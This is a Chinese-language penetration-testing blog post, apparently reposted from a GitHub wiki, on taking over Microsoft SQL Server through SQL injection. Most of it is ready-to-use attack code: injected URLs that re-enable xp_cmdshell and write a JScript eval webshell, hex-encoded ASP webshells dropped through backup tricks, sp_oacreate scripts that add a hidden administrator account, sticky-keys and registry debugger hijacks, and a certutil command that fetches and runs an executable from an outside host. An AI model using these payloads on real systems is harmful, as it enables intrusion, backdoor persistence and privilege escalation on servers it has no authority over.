---
title: "MSSQL多种姿势拿shell和提权"
date: 2019-05-21T22:19:55+08:00
draft: false
tags: ['mssql','shell']
categories: ['渗透测试']
---

继上一篇文章继续学习mssql。

<!--more-->

本文全文转载404师傅的[MSSQL_SQL_BYPASS](<https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI>)，根据自己理解略有修改。

## getshell

能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。

拿shell的两大前提就是

1. 有相应的权限db_owner
2. 知道web目录的绝对路径

我们先来了解下怎么去寻找web目录的绝对路径。

### 寻找绝对路径

1. 报错信息
2. 字典猜
3. 旁站的目录
4. 存储过程来搜索
5. 读配置文件

前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。

在mssql中有两个存储过程可以帮我们来找绝对路径：`xp_cmdshell xp_dirtree `

先来看`xp_dirtree`直接举例子

```mssql
execute master..xp_dirtree 'c:' --列出所有c:\文件、目录、子目录 
execute master..xp_dirtree 'c:',1 --只列c:\目录
execute master..xp_dirtree 'c:',1,1 --列c:\目录、文件
```

当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中

```mssql
CREATE TABLE tmp (dir varchar(8000),num int,num1 int);
insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;
```

我们再来看`xp_cmdshell`怎么去找绝对路径，实际上原理就是调用cmd来查找文件，相对来说这种方法更方便。

当然你可能遇到xp_cmdshell不能调用 如果报错

> SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用。

可以用如下命令恢复

```
;EXEC sp_configure 'show advanced options',1;//允许修改高级参数
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;  //打开xp_cmdshell扩展
RECONFIGURE;--
```

当然还不行可能xplog70.dll需要恢复，看具体情况来解决吧

接下来我们先来看cmd中怎么查找文件。

```bash
C:\Users\Y4er>for /r e:\ %i in (1*.php) do @echo %i
e:\code\php\1.php
C:\Users\Y4er>
```

那么我们只需要建立一个表 存在一个char字段就可以了

```mssql
http://192.168.130.137/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));

http://192.168.130.137/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (1*.aspx) do @echo %i'
```

然后通过注入去查询该表就可以了。

---

此时我们拿到绝对路径之后，我们接着往下看怎么拿shell

### xp_cmdshell拿shell

xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径

```mssql
http://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\404.aspx' ;
```

由于cmd写webshell的主意这些转义的问题 推荐使用certutil或者vbs什么的来下载

### 差异备份拿shell

```mssql
1. backup database 库名 to disk = 'c:\bak.bak';--

2. create table [dbo].[test] ([cmd] [image]);

3. insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)

4. backup database 库名 to disk='C:\d.asp' WITH DIFFERENTIAL,FORMAT;--
```

因为权限的问题，最好不要备份到盘符根目录

当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。

### log备份拿shell

LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式

```mssql
1. alter database 库名 set RECOVERY FULL 

2. create table cmd (a image) 

3. backup log 库名 to disk = 'c:\xxx' with init 

4. insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) 

5. backup log 库名 to disk = 'c:\xxx\2.asp'
```

log备份的好处就是备份出来的webshell的文件大小非常的小

## getsystem

我们继续来探究怎么进行提权

### xp_cmdshell

在2005中xp_cmdshell的权限是system，2008中是network。

当遇到无法写shell，或者是站库分离的时候，直接通过xp_cmdshell来下载我们的payload来上线会更加方便。下载文件通常有下面几种姿势

1. certutil
2. vbs
3. bitsadmin
4. powershell
5. ftp

这个我会放在下一篇文章中细讲。

通过下载文件之后用xp_cmdshell来执行我们的payload，通过Cobalt Strike来进行下一步操作，比如怼exp或许会更加方便。

### sp_oacreate

当xp_cmdshell 被删除可以使用这个来提权试试,恢复sp_oacreate

```
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'Ole Automation Procedures', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'show advanced options', 0;

```

sp_oacreate是一个非常危险的存储过程可以删除、复制、移动文件 还能配合sp_oamethod 来写文件执行cmd

在以前的系统有这几种用法 

1. 调用cmd 来执行命令 

```
wscript.shell执行命令

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c xxx'



Shell.Application执行命令
declare @o int
exec sp_oacreate 'Shell.Application', @o out
exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user >c:\test.txt','c:\windows\system32','','1';

```

2. 写入启动项

```
declare @sp_passwordxieo int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out
exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'd:\RECYCLER\1.vbs', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject("WSCRIPT.NETWORK")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.ComputerName'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&"/Administrators,group")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create("user","123$")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "123"'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&"/123$",user)'
exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/123$"';

```

3. 粘贴键替换

```
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';

```

大家可以灵活运用，这里也可以这样玩，把他写成vbs或者其他的来下载文件 ，为什么不直接调用cmd来下载，再2008系统上我是不成功的，但是sp_oacreate可以启动这个文件，所以换个思路

```
declare @sp_passwordxieo int, @f int, @t int, @ret int;
exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out;
exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'c:\www\1.bat', 1;
exec @ret = sp_oamethod @f, 'writeline', NULL,'@echo off';
exec @ret = sp_oamethod @f, 'writeline', NULL,'start cmd /k "cd c:\www & certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe"';


declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\www\1.bat'

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\www\file.exe'

```

当然这里只是一种思路，你完全可以用vbs来下载什么的

### 沙盒提权

```mssql
1. exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;

2. exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

3. Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Databasec:\windows\system32\ias\ias.mdb','select shell( net user itpro gmasfm /add )');
```

引用前辈们的话

> 1，Access可以调用VBS的函数，以System权限执行任意命令
> 2，Access执行这个命令是有条件的，需要一个开关被打开
> 3，这个开关在注册表里
> 4，SA是有权限写注册表的
> 5，用SA写注册表的权限打开那个开关
> 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令

### xp_regwrite

修改注册表 来劫持粘贴键 当然在2008数据库是不成立的 因为默认权限很低

```
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution
Options\sethc.EXE','Debugger','REG_SZ','C:\WINDOWS\explorer.exe';

```



mssql众多的储存过程是我们利用的关键，还有很多可能没被提出，需要自己的发现，比如在遇到iis6的拿不了shell还有个上传可以跳目录，不妨试试xp_create_subdir建立个畸形目录解析。